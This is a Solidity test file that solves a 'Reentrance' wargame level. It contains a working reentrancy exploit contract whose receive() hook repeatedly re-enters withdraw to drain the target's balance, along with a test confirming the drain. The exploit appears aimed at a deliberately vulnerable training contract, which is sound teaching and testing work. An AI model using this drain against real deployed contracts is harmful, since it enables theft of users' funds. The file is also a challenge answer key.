// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {ReentranceFactory} from "../../src/levels/ReentranceFactory.sol";
import {Reentrance} from "../../src/levels/Reentrance.sol";

/// @dev Drains the instance by re-entering withdraw before the (unchecked) debit.
contract ReentranceExploit {
    Reentrance private target;
    uint256 private amount;

    constructor(address payable _target) payable {
        target = Reentrance(_target);
    }

    function attack() external {
        amount = address(target).balance;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}

contract ReentranceLevel is LuxTest {
    ReentranceFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new ReentranceFactory();
        _register(factory);
    }

    function test_solve() public {
        vm.deal(address(factory), 1 ether); // factory forwards insertCoin to instance
        address instance = _create(factory, player, 0.001 ether);
        assertEq(instance.balance, 0.001 ether);
        _assertUnsolved(instance, player);

        ReentranceExploit exploit = (new ReentranceExploit){value: 0.001 ether}(payable(instance));
        exploit.attack();

        assertEq(instance.balance, 0);
        _assertSolved(factory, instance, player);
    }
}
